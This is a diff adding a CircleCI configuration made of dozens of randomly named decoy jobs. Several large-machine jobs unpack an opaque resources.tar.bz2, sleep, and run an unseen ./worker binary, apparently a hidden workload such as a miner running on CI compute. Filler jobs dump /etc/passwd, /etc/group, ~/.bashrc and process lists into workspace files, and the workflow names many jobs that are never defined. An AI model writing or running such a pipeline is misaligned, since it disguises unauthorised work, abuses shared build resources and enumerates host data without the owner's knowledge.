+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  CastleV10:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Titrate freezer rack overnight
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; yes "mission accomplished" | head -n3; true ; } > /tmp/queue5/P_0010
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'P_0010'
+  INIT_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/P_0010 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  metaBrushInput:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Match point load
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; getconf -a | grep -i "CHILD_MAX"; true ; } > /tmp/queue5/muonOtterPhotonMaple
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'muonOtterPhotonMaple'
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/muonOtterPhotonMaple 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+  no_idx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Round three double check
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; ps axo pid,ppid,stat,comm | tail -n +2 | awk 'NR>1 {print $1}' | sort | uniq -c | sort -nr | fold -w 45; true ; } > /tmp/queue5/20270227_003706
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - '20270227_003706'
+  run-end-to-end-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Pick up signal
+          command: |
+            pr -n /tmp/queue5/20270227_003706 2>/dev/null | head -3 || true
+      - run:
+          name: Shallow clone
+          command: git clone --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: tar -xj -f resources.tar.bz2
+      - run:
+          name: Post-build check
+          command: sleep 15
+      - run:
+          command: /bin/bash -c "./worker"
+
+  iris-dev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Patch Scope Local
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; /usr/bin/ls --color=auto /etc/*.d /var | sort; true ; } > /tmp/queue5/muonOtterPhotonMaple
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'muonOtterPhotonMaple'
+  cart_coupon_parse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Sear the toast message
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; f='/tmp/monthly.bak'; seq 5 > "$f"; while read -r n; do echo $((n * n)); done < "$f"; true ; } > /tmp/queue5/indigo-v3.1.32
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'indigo-v3.1.32'
+  Pre-Beam-Soft:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: RUN BUILD CANARY FLEET
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; for num in vic carol raj hugo ivy pete; do printf '%-8s %d\n' "${num}" ${#num}; done | paste -sd ' '; true ; } > /tmp/queue5/0buj5B3gYbrwBA2MtA9a
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - '0buj5B3gYbrwBA2MtA9a'
+  yara_sunset:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Soundcheck checkpoint
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; ps -eo pid,user,comm,%mem | head --lines=2 | sort --reverse --numeric-sort -k 3; true ; } > /tmp/queue5/user-ROM-blob_Gadget
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'user-ROM-blob_Gadget'
+  lam_hat:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Plan Thunder
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; find /proc/self -type d -user $(id -un) -exec du -sh {} + 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/queue5/filterdraftbuffer
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'filterdraftbuffer'
+  drawcontractthread:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: BatchCostCentersStep
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; expand -t 7 ~/.bashrc | sort -u; true ; } > /tmp/queue5/chromeRustyForestEast
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'chromeRustyForestEast'
+  mission-yankee:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: post
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; nl -s'. ' /etc/os-release | head -n15; true ; } > /tmp/queue5/rusty_frozen_mountain_cedar
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'rusty_frozen_mountain_cedar'
+  take-when:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Table swap
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; ls -lp | wc -l; true ; } > /tmp/queue5/P_0010
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'P_0010'
+  ian2003:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Tomorrow bake the level
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; find ${HOME} -maxdepth 1 | awk -F/ '{print NF-1}' | xargs; true ; } > /tmp/queue5/ae7d4813
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'ae7d4813'
+  lvsignal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: ShredSharedDrive7
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; for entry in magenta pink purple blue black; do echo ${#entry}; done | sort; true ; } > /tmp/queue5/packet_fen_token
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'packet_fen_token'
+  WithCube:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: I own accessibility audit spot check
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; [ -t 0 ] || echo "stdin is not a terminal"; true ; } > /tmp/queue5/4Ob
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - '4Ob'
+  globeish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: remember to export the chapter markers
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; ls --reverse -vh --full-time /etc/skel/.* | fmt -w 60; true ; } > /tmp/queue5/reef376
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'reef376'
+  skutzoustpas-cli:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Runway 33 reaping
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; head -n 4 /etc/group | sort -t : -k 3 -n | sed 's/:.*//'; true ; } > /tmp/queue5/YgNl3qfrZ6e33sV6I02BBb
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'YgNl3qfrZ6e33sV6I02BBb'
+  text_platinum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: doRerunPropertyTests
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; /bin/ls -A /usr/sbin | wc -w; true ; } > /tmp/queue5/fo
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'fo'
+  XXLO:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Embed event stream mk4
+          command: |
+            mkdir -p /tmp/queue5
+            set +o pipefail 2>/dev/null; for i in $(seq 1 10000); do echo "q-$((i*19))"; done > /tmp/queue5/west-moor-payload; true
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'west-moor-payload'
+  choosehidden:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: staging shipping labels
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; cut -c1-7 /etc/passwd | head -10; true ; } > /tmp/queue5/MODULE_SILVER_BETA
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'MODULE_SILVER_BETA'
+  interfaceVal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: With thanks brief the helpdesk
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; echo "name: demo" | cat -A; true ; } > /tmp/queue5/RedAdmin
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'RedAdmin'
+  Sceneer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Finalise the filter chips
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -cXF "$HOME" | wc -l; true ; } > /tmp/queue5/NODE
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'NODE'
+  colPlatinum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: doStressTestSmokeTests
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; if test -x /bin/sh ; then echo true; else echo 'false'; fi; true ; } > /tmp/queue5/snapshot_21713
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'snapshot_21713'
+  TME-OWED-C:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue5
+      - run:
+          name: Move the needle on seeding
+          command: |
+            mkdir -p /tmp/queue5
+            { set +o pipefail 2>/dev/null; set -- cat lion dog; shift; echo $@; true ; } > /tmp/queue5/tmp-52f
+            echo "stage ok Xi"
+      - persist_to_workspace:
+          root: /tmp/queue5
+          paths:
+            - 'tmp-52f'
+workflows:
+  build-and-test:
+    jobs:
+      - metaBrushInput
+      - iris-dev:
+          requires:
+            - metaBrushInput
+      - package:
+          requires:
+            - iris-dev
+      - pairsCache:
+          requires:
+            - iris-dev
+      - cart_coupon_parse:
+          requires:
+            - pairsCache
+      - q1-cleanup:
+          requires:
+            - cart_coupon_parse
+      - mega-migration:
+          requires:
+            - cart_coupon_parse
+      - Pre-Beam-Soft:
+          requires:
+            - mega-migration
+      - add-webhook-leak:
+          requires:
+            - Pre-Beam-Soft
+      - readComplexArticleAdapter:
+          requires:
+            - Pre-Beam-Soft
+      - yara_sunset:
+          requires:
+            - readComplexArticleAdapter
+      - tweak-retry-reload:
+          requires:
+            - yara_sunset
+      - kAGwbcNwIo:
+          requires:
+            - yara_sunset
+      - lam_hat:
+          requires:
+            - kAGwbcNwIo
+      - fix-1105:
+          requires:
+            - lam_hat
+      - cfg_StorePromise:
+          requires:
+            - lam_hat
+      - drawcontractthread:
+          requires:
+            - cfg_StorePromise
+      - vb-3:
+          requires:
+            - drawcontractthread
+      - pool_internal:
+          requires:
+            - drawcontractthread
+      - mission-yankee:
+          requires:
+            - pool_internal
+      - brodcast:
+          requires:
+            - mission-yankee
+      - CastleV10:
+          requires:
+            - mission-yankee
+      - take-when:
+          requires:
+            - CastleV10
+      - INIT_QA:
+          requires:
+            - take-when
+      - jigsaw-tiger:
+          requires:
+            - take-when
+      - ian2003:
+          requires:
+            - jigsaw-tiger
+      - q4-cleanup:
+          requires:
+            - ian2003
+      - xVectorCompiler:
+          requires:
+            - ian2003
+      - lvsignal:
+          requires:
+            - xVectorCompiler
+      - bake-it:
+          requires:
+            - lvsignal
+      - GE:
+          requires:
+            - lvsignal
+      - WithCube:
+          requires:
+            - GE
+      - add-parse-redirect:
+          requires:
+            - WithCube
+      - Compare-VectorObject:
+          requires:
+            - WithCube
+      - globeish:
+          requires:
+            - Compare-VectorObject
+      - MERGE_UAT:
+          requires:
+            - globeish
+      - pink-800-accent
+      - skutzoustpas-cli:
+          requires:
+            - pink-800-accent
+      - check-end-to-end-regression-suite:
+          requires:
+            - skutzoustpas-cli
+      - ro_Hant_CL:
+          requires:
+            - skutzoustpas-cli
+      - text_platinum:
+          requires:
+            - ro_Hant_CL
+      - teh-ci:
+          requires:
+            - text_platinum
+      - sdfgh:
+          requires:
+            - text_platinum
+      - XXLO:
+          requires:
+            - sdfgh
+      - nova-rev:
+          requires:
+            - XXLO
+      - deferPendingCountMax:
+          requires:
+            - XXLO
+      - choosehidden:
+          requires:
+            - deferPendingCountMax
+      - go-live:
+          requires:
+            - choosehidden
+      - log_throw_deploy:
+          requires:
+            - choosehidden
+      - interfaceVal:
+          requires:
+            - log_throw_deploy
+      - ivan-ship:
+          requires:
+            - interfaceVal
+      - buff3r:
+          requires:
+            - interfaceVal
+      - Sceneer:
+          requires:
+            - buff3r
+      - Verify_Release7:
+          requires:
+            - Sceneer
+      - isBottom:
+          requires:
+            - Sceneer
+      - colPlatinum:
+          requires:
+            - isBottom
+      - run-nightly-test-matrix:
+          requires:
+            - colPlatinum
+      - SW-FIRST-TAB:
+          requires:
+            - colPlatinum
+      - TME-OWED-C:
+          requires:
+            - SW-FIRST-TAB
+      - Package_Suite4:
+          requires:
+            - TME-OWED-C
+      - no_idx
+      - run-end-to-end-docker-image:
+          requires:
+            - no_idx
+      - cn-sierra:
+          requires:
+            - no_idx
+      - alice-build:
+          requires:
+            - cn-sierra
+      - PHCurveDidRedoNotification:
+          requires:
+            - cn-sierra
+      - dp-2a:
+          requires:
+            - PHCurveDidRedoNotification
+      - sk-Hans:
+          requires:
+            - PHCurveDidRedoNotification
+      - succes-only:
+          requires:
+            - sk-Hans
+      - TotalGlobalFastCheckout:
+          requires:
+            - sk-Hans
+      - Ship_Tests8:
+          requires:
+            - TotalGlobalFastCheckout
+      - knnKNNLayer:
+          requires:
+            - TotalGlobalFastCheckout
+      - edge-v3:
+          requires:
+            - knnKNNLayer
+      - BACKUP_RESOURCE_PIN_43:
+          requires:
+            - knnKNNLayer
+      - LAB_INIT_6:
+          requires:
+            - BACKUP_RESOURCE_PIN_43
+      - PARAM:
+          requires:
+            - BACKUP_RESOURCE_PIN_43
+      - Prepare_Pipeline1:
+          requires:
+            - PARAM
+      - meeting_2011_06:
+          requires:
+            - PARAM
+      - hu-push:
+          requires:
+            - meeting_2011_06
+      - heroDef:
+          requires:
+            - meeting_2011_06
+      - perseus-final:
+          requires:
+            - heroDef
